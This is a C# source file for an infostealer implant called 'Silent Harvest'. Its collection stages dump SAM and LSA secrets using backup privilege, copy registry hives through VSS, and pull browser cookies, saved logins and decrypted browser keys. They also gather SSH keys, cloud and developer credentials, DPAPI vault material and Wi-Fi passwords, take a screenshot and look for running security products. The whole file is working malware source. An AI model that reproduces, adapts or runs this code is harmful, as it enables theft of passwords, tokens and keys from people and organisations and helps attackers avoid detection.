// silent-harvest implant — collection stages
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace SilentHarvest
{
    public class Part
    {
        public string Name;
        public byte[] Data;
        public string MetaJson; // raw json object or "null"
        public Part(string name, byte[] data, string meta)
        {
            Name = name; Data = data; MetaJson = meta ?? "null";
        }
    }

    public static class Stages
    {
        // ------------------------------------------------------------ privileges
        public static bool IsElevated()
        {
            IntPtr tok;
            if (!Native.OpenProcessToken(Native.GetCurrentProcess(), Native.TOKEN_QUERY, out tok))
                return false;
            try
            {
                int len;
                Native.GetTokenInformation(tok, Native.TokenElevation, IntPtr.Zero, 0, out len);
                IntPtr buf = Marshal.AllocHGlobal(8);
                try
                {
                    if (!Native.GetTokenInformation(tok, Native.TokenElevation, buf, 8, out len))
                        return false;
                    return Marshal.ReadInt32(buf) != 0;
                }
                finally { Marshal.FreeHGlobal(buf); }
            }
            finally { Native.CloseHandle(tok); }
        }

        public static bool EnableBackupPrivilege()
        {
            IntPtr tok;
            if (!Native.OpenProcessToken(Native.GetCurrentProcess(),
                    Native.TOKEN_ADJUST_PRIVILEGES | Native.TOKEN_QUERY, out tok))
                return false;
            try
            {
                Native.LUID luid = new Native.LUID();
                if (!Native.LookupPrivilegeValueW(null, "SeBackupPrivilege", ref luid))
                    return false;
                Native.TOKEN_PRIVILEGES tp = new Native.TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privilege.Luid = luid;
                tp.Privilege.Attributes = Native.SE_PRIVILEGE_ENABLED;
                if (!Native.AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                    return false;
                return Marshal.GetLastWin32Error() != Native.ERROR_NOT_ALL_ASSIGNED;
            }
            finally { Native.CloseHandle(tok); }
        }

        // ------------------------------------------------------------ registry
        // The "Silent Harvest" technique: open protected keys with
        // NtOpenKeyEx(REG_OPTION_BACKUP_RESTORE) under SeBackupPrivilege and
        // bulk-read values via RegQueryMultipleValuesW.
        public static string RegistryStage(List<Part> parts)
        {
            Util.JsonObj doc = new Util.JsonObj();
            int keysRead = 0;

            // 1) resolve current control set (readable by everyone)
            Dictionary<string, object> sel = Util.ReadKeyValues(
                @"\Registry\Machine\SYSTEM\Select",
                new string[] { "Current", "Default", "Failed", "LastKnownGood" });
            int ccs = 1;
            if ("OK".Equals(sel["_status"]))
            {
                object cur;
                if (sel.TryGetValue("#Current", out cur) && ((byte[])cur).Length >= 4)
                    ccs = BitConverter.ToInt32((byte[])cur, 0);
                AddKey(doc, @"HKLM\SYSTEM\Select", sel);
                keysRead++;
            }
            string cs = "ControlSet" + ccs.ToString("D3");
            Util.Log("current control set: {0}", cs);

            // 2) bootkey components: stored as the CLASS names of
            //    Lsa\{JD,Skew1,GBG,Data} (readable) — also proves the
            //    NtOpenKeyEx + backup-intent path works on this host
            string[] bk = new string[] { "JD", "Skew1", "GBG", "Data" };
            foreach (string k in bk)
            {
                Dictionary<string, object> r = Util.ReadKeyClass(
                    @"\Registry\Machine\SYSTEM\" + cs + @"\Control\Lsa\" + k);
                AddKey(doc, @"HKLM\SYSTEM\" + cs + @"\Control\Lsa\" + k, r);
                keysRead++;
            }

            // 3) SAM: account F + per-RID F values (requires SeBackupPrivilege)
            Dictionary<string, object> acct = Util.ReadKeyValues(
                @"\Registry\Machine\SAM\SAM\Domains\Account",
                new string[] { "F" });
            AddKey(doc, @"HKLM\SAM\SAM\Domains\Account", acct);
            keysRead++;
            Util.Log("SAM account F: {0}", acct["_status"]);

            if ("OK".Equals(acct["_status"]))
            {
                string users;
                List<string> rids = Util.EnumSubKeysOfNt(
                    @"\Registry\Machine\SAM\SAM\Domains\Account\Users", out users);
                Util.Log("SAM rids: {0} ({1})", rids.Count, users);
                foreach (string rid in rids)
                {
                    if (rid.Length != 4) continue; // skip "Names"
                    Dictionary<string, object> r = Util.ReadKeyValues(
                        @"\Registry\Machine\SAM\SAM\Domains\Account\Users\" + rid,
                        new string[] { "F", "V" });
                    AddKey(doc, @"HKLM\SAM\SAM\Domains\Account\Users\" + rid, r);
                    keysRead++;
                }
            }

            // 4) SECURITY: LSA secrets + cached domain logons
            string secretsStatus;
            List<string> secrets = Util.EnumSubKeysOfNt(
                @"\Registry\Machine\SECURITY\Policy\Secrets", out secretsStatus);
            Util.Log("LSA secrets: {0} ({1})", secrets.Count, secretsStatus);
            int secretsRead = 0;
            foreach (string s in secrets)
            {
                if (s.StartsWith("NL$Control")) continue;
                // CurrVal holds one unnamed (default) value
                Dictionary<string, object> r = Util.ReadKeyValues(
                    @"\Registry\Machine\SECURITY\Policy\Secrets\" + s + @"\CurrVal",
                    new string[] { "" });
                AddKey(doc, @"HKLM\SECURITY\Policy\Secrets\" + s + @"\CurrVal", r);
                keysRead++;
                if ("OK".Equals(r["_status"])) secretsRead++;
            }
            if (secretsStatus != null)
                doc.Add("_secrets_enum", secretsStatus);

            Dictionary<string, object> cache = Util.ReadKeyValues(
                @"\Registry\Machine\SECURITY\Cache",
                new string[] { "NL$1", "NL$2", "NL$3", "NL$4", "NL$5",
                               "NL$6", "NL$7", "NL$8", "NL$9", "NL$10", "NL$Control" });
            AddKey(doc, @"HKLM\SECURITY\Cache", cache);
            keysRead++;

            byte[] json = Encoding.UTF8.GetBytes(doc.ToString());
            parts.Add(new Part("regvals.json", json,
                new Util.JsonObj().Add("keys", keysRead.ToString())
                                  .Add("secrets_read", secretsRead.ToString()).ToString()));
            return "keys=" + keysRead + " secrets=" + secretsRead;
        }

        private static void AddKey(Util.JsonObj doc, string path, Dictionary<string, object> vals)
        {
            Util.JsonObj keyObj = new Util.JsonObj();
            foreach (KeyValuePair<string, object> kv in vals)
            {
                if (kv.Key.StartsWith("#"))
                {
                    string baseName = kv.Key.Substring(1);
                    int[] tl = (int[])vals[baseName];
                    keyObj.AddRaw(baseName, string.Format(
                        "{{\"type\":{0},\"len\":{1},\"b64\":\"{2}\"}}",
                        tl[0], tl[1], Util.B64((byte[])kv.Value)));
                }
                else if (!kv.Key.StartsWith("_"))
                {
                    int[] tl = kv.Value as int[];
                    if (tl != null) continue; // covered by the # entry
                }
            }
            object st;
            if (vals.TryGetValue("_status", out st))
                keyObj.Add("_status", (string)st);
            doc.AddRaw(path, keyObj.ToString());
        }

        // ------------------------------------------------------------ hives
        // Full-hive copies via VSS through the in-box esentutl (needs elevation).
        public static string HiveStage(List<Part> parts)
        {
            string[] hives = new string[] { "SAM", "SECURITY", "SYSTEM" };
            int ok = 0;
            string tempDir = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName()
                .Replace(".", ""));
            Directory.CreateDirectory(tempDir);
            try
            {
                foreach (string h in hives)
                {
                    string src = Path.Combine(@"C:\Windows\System32\config", h);
                    string dst = Path.Combine(tempDir, h);
                    try
                    {
                        ProcessStartInfo psi = new ProcessStartInfo("esentutl.exe",
                            "/y /vss \"" + src + "\" /d \"" + dst + "\"");
                        psi.CreateNoWindow = true;
                        psi.UseShellExecute = false;
                        psi.RedirectStandardOutput = true;
                        psi.RedirectStandardError = true;
                        Process p = Process.Start(psi);
                        if (!p.WaitForExit(60000)) { try { p.Kill(); } catch { } }
                        if (p.ExitCode == 0 && File.Exists(dst))
                        {
                            byte[] data = File.ReadAllBytes(dst);
                            parts.Add(new Part("hive:" + h, data,
                                new Util.JsonObj().Add("src", src).Add("method", "esentutl/vss").ToString()));
                            ok++;
                            Util.Log("hive {0}: {1} bytes via VSS", h, data.Length);
                        }
                        else
                        {
                            Util.Log("hive {0}: esentutl rc={1}", h, p.ExitCode);
                        }
                    }
                    catch (Exception e) { Util.Log("hive {0}: {1}", h, e.Message); }
                    finally { try { if (File.Exists(dst)) File.Delete(dst); } catch { } }
                }
            }
            finally
            {
                try { Directory.Delete(tempDir, true); } catch { }
            }
            return "hives=" + ok + "/3";
        }

        // ------------------------------------------------------------ browsers
        private static string[][] Browsers()
        {
            return new string[][]
            {
                new string[] { "chrome",  @"Google\Chrome\User Data" },
                new string[] { "edge",    @"Microsoft\Edge\User Data" },
                new string[] { "brave",   @"BraveSoftware\Brave-Browser\User Data" },
                new string[] { "chromium", @"Chromium\User Data" },
                new string[] { "vivaldi", @"Vivaldi\User Data" },
                new string[] { "opera",   @"Opera Software\Opera Stable" },
                new string[] { "opera-gx",@"Opera Software\Opera GX Stable" },
            };
        }

        public static string BrowserStage(List<Part> parts)
        {
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            int nParts = 0, nProfiles = 0;

            foreach (string[] b in Browsers())
            {
                string name = b[0];
                string ud = Path.Combine(localAppData, b[1]);
                if (!Directory.Exists(ud)) continue;

                // Local State: DPAPI-wrapped AES key for v10/v11 blobs
                string lsPath = Path.Combine(ud, "Local State");
                if (File.Exists(lsPath))
                {
                    try
                    {
                        byte[] ls = Util.ReadFileLoose(lsPath);
                        if (ls != null)
                        {
                            parts.Add(new Part("b:" + name + "/LocalState", ls,
                                new Util.JsonObj().Add("path", lsPath).ToString()));
                            nParts++;

                            string lsTxt = Encoding.UTF8.GetString(ls);
                            Match m = Regex.Match(lsTxt, "\"encrypted_key\"\\s*:\\s*\"([A-Za-z0-9+/=]+)\"");
                            if (m.Success)
                            {
                                byte[] blob = Convert.FromBase64String(m.Groups[1].Value);
                                // strip the 5-byte "DPAPI" prefix before unwrapping
                                byte[] toUnprotect = blob;
                                if (blob.Length > 5 && blob[0] == (byte)'D' && blob[1] == (byte)'P'
                                    && blob[2] == (byte)'A' && blob[3] == (byte)'P' && blob[4] == (byte)'I')
                                    toUnprotect = Slice(blob, 5, blob.Length - 5);
                                byte[] key = DpapiUnprotect(toUnprotect);
                                if (key != null && key.Length >= 32)
                                {
                                    byte[] k32 = new byte[32];
                                    Buffer.BlockCopy(key, key.Length - 32, k32, 0, 32);
                                    parts.Add(new Part("b:" + name + "/aeskey.bin", k32,
                                        new Util.JsonObj().Add("src", "os_crypt.encrypted_key").ToString()));
                                    nParts++;
                                    Util.Log("{0}: os_crypt key recovered ({1}B)", name, key.Length);
                                }
                                else
                                {
                                    parts.Add(new Part("b:" + name + "/key_status.txt",
                                        Encoding.UTF8.GetBytes("dpapi_unwrap_failed len=" +
                                            (toUnprotect == null ? -1 : toUnprotect.Length)), null));
                                    Util.Log("{0}: dpapi unwrap FAILED", name);
                                }
                            }
                            Match abe = Regex.Match(lsTxt, "\"app_bound_encrypted_key\"\\s*:\\s*\"([A-Za-z0-9+/=]+)\"");
                            if (abe.Success)
                            {
                                byte[] abeBlob = Convert.FromBase64String(abe.Groups[1].Value);
                                parts.Add(new Part("b:" + name + "/ABEblob.bin", abeBlob,
                                    new Util.JsonObj().Add("src", "app_bound_encrypted_key").ToString()));
                                nParts++;
                            }
                        }
                    }
                    catch (Exception e) { Util.Log("{0}: localstate {1}", name, e.Message); }
                }

                // profiles
                List<string> profiles = new List<string>();
                try
                {
                    foreach (string d in Directory.GetDirectories(ud))
                    {
                        string dn = Path.GetFileName(d);
                        if (dn == "Default" || dn.StartsWith("Profile ")) profiles.Add(dn);
                    }
                }
                catch { }
                if (profiles.Count == 0 && File.Exists(Path.Combine(ud, "Cookies")))
                    profiles.Add(".");

                foreach (string prof in profiles)
                {
                    nProfiles++;
                    string pd = prof == "." ? ud : Path.Combine(ud, prof);
                    string[][] files = new string[][]
                    {
                        // v114+ moved cookies under Network\; older builds keep it in profile root
                        new string[] { "Cookies",  Path.Combine(pd, @"Network\Cookies") },
                        new string[] { "Cookies2", Path.Combine(pd, "Cookies") },
                        new string[] { "LoginData", Path.Combine(pd, "Login Data") },
                        new string[] { "WebData",  Path.Combine(pd, "Web Data") },
                        new string[] { "History",  Path.Combine(pd, "History") },
                    };
                    foreach (string[] f in files)
                    {
                        if (!File.Exists(f[1])) continue;
                        byte[] data = Util.ReadFileLoose(f[1]);
                        string method = "file";
                        if (data == null)
                        {
                            // exclusive lock (Chrome holds Cookies this way while
                            // running) — try duplicating the owner's handle
                            string rel;
                            if (f[0] == "Cookies") rel = @"Network\Cookies";
                            else if (f[0] == "Cookies2") rel = "Cookies";
                            else if (f[0] == "LoginData") rel = "Login Data";
                            else if (f[0] == "WebData") rel = "Web Data";
                            else rel = "History";
                            if (prof != ".")
                            {
                                string suffix = b[1] + "\\" + prof + "\\" + rel;
                                data = Util.ReadFileViaHandleDup(suffix);
                                if (data != null) method = "handle-dup";
                            }
                        }
                        if (data == null)
                        {
                            Util.Log("{0}/{1}/{2}: read failed (locked)", name, prof, f[0]);
                            continue;
                        }
                        parts.Add(new Part("b:" + name + "/" + prof + "/" + f[0], data,
                            new Util.JsonObj().Add("path", f[1]).Add("size", data.Length.ToString())
                                              .Add("method", method).ToString()));
                        nParts++;
                        Util.Log("{0}/{1}/{2}: {3} bytes ({4})", name, prof, f[0], data.Length, method);
                    }

                    // Local Storage leveldb: site tokens/JWTs live here, not app-bound
                    try
                    {
                        string lsDir = Path.Combine(pd, @"Local Storage\leveldb");
                        if (Directory.Exists(lsDir))
                        {
                            foreach (string f in Directory.GetFiles(lsDir))
                            {
                                if (!f.EndsWith(".log") && !f.EndsWith(".ldb")) continue;
                                byte[] data = Util.ReadFileLoose(f);
                                if (data == null || data.Length > 2 * 1024 * 1024) continue;
                                parts.Add(new Part(
                                    "b:" + name + "/" + prof + "/LocalStorage/" + Path.GetFileName(f),
                                    data, new Util.JsonObj().Add("path", f).ToString()));
                                nParts++;
                            }
                        }
                    }
                    catch { }
                }
            }

            // firefox
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string ffRoot = Path.Combine(appData, @"Mozilla\Firefox\Profiles");
            if (Directory.Exists(ffRoot))
            {
                foreach (string d in Directory.GetDirectories(ffRoot))
                {
                    string pn = Path.GetFileName(d);
                    string[] ffFiles = new string[] { "key4.db", "logins.json", "logins.db", "cert9.db" };
                    foreach (string f in ffFiles)
                    {
                        string fp = Path.Combine(d, f);
                        if (!File.Exists(fp)) continue;
                        byte[] data = Util.ReadFileLoose(fp);
                        if (data == null) continue;
                        parts.Add(new Part("ff:" + pn + "/" + f, data,
                            new Util.JsonObj().Add("path", fp).Add("size", data.Length.ToString()).ToString()));
                        nParts++;
                    }
                }
            }
            return "parts=" + nParts + " profiles=" + nProfiles;
        }

        // ------------------------------------------------------------ DPAPI
        private static byte[] Slice(byte[] src, int off, int len)
        {
            byte[] dst = new byte[len];
            Buffer.BlockCopy(src, off, dst, 0, len);
            return dst;
        }

        public static byte[] DpapiUnprotect(byte[] blob)
        {
            Native.DATA_BLOB inBlob = new Native.DATA_BLOB();
            Native.DATA_BLOB outBlob = new Native.DATA_BLOB();
            GCHandle h = GCHandle.Alloc(blob, GCHandleType.Pinned);
            try
            {
                inBlob.cbData = blob.Length;
                inBlob.pbData = h.AddrOfPinnedObject();
                if (!Native.CryptUnprotectData(ref inBlob, null, IntPtr.Zero, IntPtr.Zero,
                                               IntPtr.Zero, 0, ref outBlob))
                    return null;
                byte[] outData = new byte[outBlob.cbData];
                Marshal.Copy(outBlob.pbData, outData, 0, outBlob.cbData);
                Native.LocalFree(outBlob.pbData);
                return outData;
            }
            finally { h.Free(); }
        }


        // ------------------------------------------------------------ keys & cloud
        // plaintext credential files under the user profile - never app-bound
        public static string KeysStage(List<Part> parts)
        {
            string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            int n = 0;
            string[][] targets = new string[][]
            {
                new string[] { "ssh",    Path.Combine(home, ".ssh") },
                new string[] { "aws",    Path.Combine(home, ".aws") },
                new string[] { "kube",   Path.Combine(home, ".kube") },
                new string[] { "azure",  Path.Combine(home, ".azure") },
                new string[] { "gcloud", Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "gcloud") },
            };
            foreach (string[] t in targets)
            {
                if (!Directory.Exists(t[1])) continue;
                try
                {
                    foreach (string f in Directory.GetFiles(t[1], "*", SearchOption.AllDirectories))
                    {
                        byte[] data = Util.ReadFileLoose(f);
                        if (data == null) continue;
                        string rel = f.Substring(t[1].Length + 1);
                        parts.Add(new Part("win:key/" + t[0] + "/" + rel, data,
                            new Util.JsonObj().Add("path", f).Add("size", data.Length.ToString()).ToString()));
                        n++;
                    }
                }
                catch { }
            }
            string[][] files = new string[][]
            {
                new string[] { "netrc",           Path.Combine(home, ".netrc") },
                new string[] { "git-credentials", Path.Combine(home, ".git-credentials") },
                new string[] { "docker-config",   Path.Combine(home, @".docker\config.json") },
                new string[] { "npmrc",           Path.Combine(home, ".npmrc") },
                new string[] { "pypirc",          Path.Combine(home, ".pypirc") },
            };
            foreach (string[] f in files)
            {
                byte[] data = Util.ReadFileLoose(f[1]);
                if (data == null) continue;
                parts.Add(new Part("win:key/" + f[0], data, new Util.JsonObj().Add("path", f[1]).ToString()));
                n++;
            }
            return "keys=" + n;
        }

        // ------------------------------------------------------------ DPAPI vault
        // raw material: DPAPI masterkeys + Credential Manager vault blobs +
        // FTP client configs with legacy-obfuscated passwords
        public static string VaultStage(List<Part> parts)
        {
            int n = 0;
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            string[][] dirs = new string[][]
            {
                new string[] { "protect",       Path.Combine(roaming, @"Microsoft\Protect") },
                new string[] { "vault-local",   Path.Combine(local,   @"Microsoft\Vault") },
                new string[] { "vault-roaming", Path.Combine(roaming, @"Microsoft\Vault") },
                new string[] { "filezilla",     Path.Combine(roaming, @"FileZilla") },
            };
            foreach (string[] d in dirs)
            {
                if (!Directory.Exists(d[1])) continue;
                try
                {
                    foreach (string f in Directory.GetFiles(d[1], "*", SearchOption.AllDirectories))
                    {
                        byte[] data = Util.ReadFileLoose(f);
                        if (data == null || data.Length > 2 * 1024 * 1024) continue;
                        string rel = f.Substring(d[1].Length + 1).Replace('\\', '_');
                        parts.Add(new Part("win:" + d[0] + "/" + rel, data,
                            new Util.JsonObj().Add("path", f).Add("size", data.Length.ToString()).ToString()));
                        n++;
                    }
                }
                catch { }
            }

            // RDP server hints (readable registry, no elevation needed)
            try
            {
                Microsoft.Win32.RegistryKey k =
                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Terminal Server Client\Servers");
                if (k != null)
                {
                    System.Text.StringBuilder sb = new System.Text.StringBuilder();
                    foreach (string sub in k.GetSubKeyNames())
                    {
                        string hint = (string)k.OpenSubKey(sub).GetValue("UsernameHint", "");
                        sb.Append(sub).Append('\t').Append(hint).Append('\n');
                    }
                    if (sb.Length > 0)
                    {
                        parts.Add(new Part("win:rdp-hints",
                            System.Text.Encoding.UTF8.GetBytes(sb.ToString()),
                            new Util.JsonObj().Add("count", k.GetSubKeyNames().Length.ToString()).ToString()));
                        n++;
                    }
                }
            }
            catch { }

            // PuTTY saved sessions (hostnames/users - recon for key reuse)
            try
            {
                Microsoft.Win32.RegistryKey k =
                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                        @"Software\SimonTatham\PuTTY\Sessions");
                if (k != null)
                {
                    System.Text.StringBuilder sb = new System.Text.StringBuilder();
                    foreach (string sub in k.GetSubKeyNames())
                    {
                        Microsoft.Win32.RegistryKey sk = k.OpenSubKey(sub);
                        sb.Append(sub).Append('\t')
                          .Append(sk.GetValue("HostName", "")).Append('\t')
                          .Append(sk.GetValue("UserName", "")).Append('\n');
                    }
                    if (sb.Length > 0)
                    {
                        parts.Add(new Part("win:putty-sessions",
                            System.Text.Encoding.UTF8.GetBytes(sb.ToString()), null));
                        n++;
                    }
                }
            }
            catch { }
            return "vault=" + n;
        }

        // ------------------------------------------------------------ wifi
        public static string WifiStage(List<Part> parts, bool elevated)
        {
            try
            {
                System.Text.StringBuilder sb = new System.Text.StringBuilder();
                ProcessStartInfo psi = new ProcessStartInfo("netsh", "wlan show profiles");
                psi.CreateNoWindow = true; psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                Process p = Process.Start(psi);
                string list = p.StandardOutput.ReadToEnd();
                p.WaitForExit(10000);
                sb.Append(list);
                foreach (string line in list.Split('\n'))
                {
                    int i = line.IndexOf(':');
                    if (i < 0 || !line.Contains("Profile")) continue;
                    string name = line.Substring(i + 1).Trim();
                    if (name.Length == 0 || !elevated) continue;
                    ProcessStartInfo psi2 = new ProcessStartInfo("netsh",
                        "wlan show profile name=\"" + name + "\" key=clear");
                    psi2.CreateNoWindow = true; psi2.UseShellExecute = false;
                    psi2.RedirectStandardOutput = true;
                    Process p2 = Process.Start(psi2);
                    sb.Append(p2.StandardOutput.ReadToEnd());
                    p2.WaitForExit(10000);
                }
                byte[] data = System.Text.Encoding.UTF8.GetBytes(sb.ToString());
                parts.Add(new Part("win:wifi", data,
                    new Util.JsonObj().Add("elevated", elevated ? "true" : "false").ToString()));
                return "wifi=ok(" + (elevated ? "keys" : "names-only") + ")";
            }
            catch (Exception e) { Util.Log("wifi stage: {0}", e.Message); return "wifi=fail"; }
        }

        // ------------------------------------------------------------ screenshot
        public static byte[] ScreenshotPng()
        {
            try
            {
                System.Drawing.Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                using (System.Drawing.Bitmap bmp = new System.Drawing.Bitmap(bounds.Width, bounds.Height))
                {
                    using (System.Drawing.Graphics g = System.Drawing.Graphics.FromImage(bmp))
                        g.CopyFromScreen(bounds.Location, System.Drawing.Point.Empty, bounds.Size);
                    using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
                    {
                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                        return ms.ToArray();
                    }
                }
            }
            catch (Exception e) { Util.Log("screenshot: {0}", e.Message); return null; }
        }

        // ------------------------------------------------------------ recon
        private static readonly string[] EDR_NAMES = new string[]
        {
            "MsMpEng", "NisSrv", "CrowdStrike", "CSFalcon", "SentinelAgent",
            "SentinelServiceHost", "Cybereason", "Tanium", "carbonblack",
            "xagt", "SophosHealth", "esensor", "osqueryd", "wazuh", "Sysmon",
            "ekrn", "avp", "kavfs", "masvc", "McAfee", "bdagent", "360tray",
            "Traps", "panhlpsvc", "dsmonitor", "SafeService",
        };

        public static string EdrScan(List<Part> parts)
        {
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            try
            {
                foreach (Process proc in Process.GetProcesses())
                {
                    string name = proc.ProcessName.ToLowerInvariant();
                    foreach (string edr in EDR_NAMES)
                    {
                        if (name.Contains(edr.ToLowerInvariant()))
                        {
                            sb.Append(proc.ProcessName).Append('\n');
                            break;
                        }
                    }
                }
            }
            catch { }
            string hits = sb.ToString();
            parts.Add(new Part("win:edr", System.Text.Encoding.UTF8.GetBytes(
                hits.Length > 0 ? hits : "none detected\n"), null));
            return hits.Length > 0 ? ("edr=" + hits.Replace("\n", ",").TrimEnd(',')) : "edr=none";
        }

        // ------------------------------------------------------------ sysinfo
        public static string SysinfoJson(bool elevated, bool backupPriv)
        {
            Util.JsonObj o = new Util.JsonObj();
            o.Add("host", Environment.MachineName);
            o.Add("user", Environment.UserName);
            o.Add("domain", Environment.UserDomainName);
            string os = "";
            try
            {
                // Environment.OSVersion lies without a compat manifest; read the
                // real thing through the same NtOpenKeyEx+multi-read path
                Dictionary<string, object> cv = Util.ReadKeyValues(
                    @"\Registry\Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion",
                    new string[] { "ProductName", "CurrentBuildNumber", "DisplayVersion" });
                if ("OK".Equals(cv["_status"]) || "OK(no-backup-priv)".Equals(cv["_status"]))
                {
                    object pn, cb, dv;
                    if (cv.TryGetValue("#ProductName", out pn))
                        os += System.Text.Encoding.Unicode.GetString((byte[])pn).TrimEnd('\0');
                    if (cv.TryGetValue("#DisplayVersion", out dv))
                        os += " " + System.Text.Encoding.Unicode.GetString((byte[])dv).TrimEnd('\0');
                    if (cv.TryGetValue("#CurrentBuildNumber", out cb))
                        os += " build " + System.Text.Encoding.Unicode.GetString((byte[])cb).TrimEnd('\0');
                    os = os.Trim();
                }
            }
            catch { }
            if (os.Length == 0) os = Environment.OSVersion.VersionString;
            o.Add("os", os);
            o.Add("elevated", elevated ? "true" : "false");
            o.Add("se_backup", backupPriv ? "true" : "false");
            o.Add("ts", ((long)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds).ToString());
            o.Add("arch", IntPtr.Size == 8 ? "x64" : "x86");
            return o.ToString();
        }
    }
}
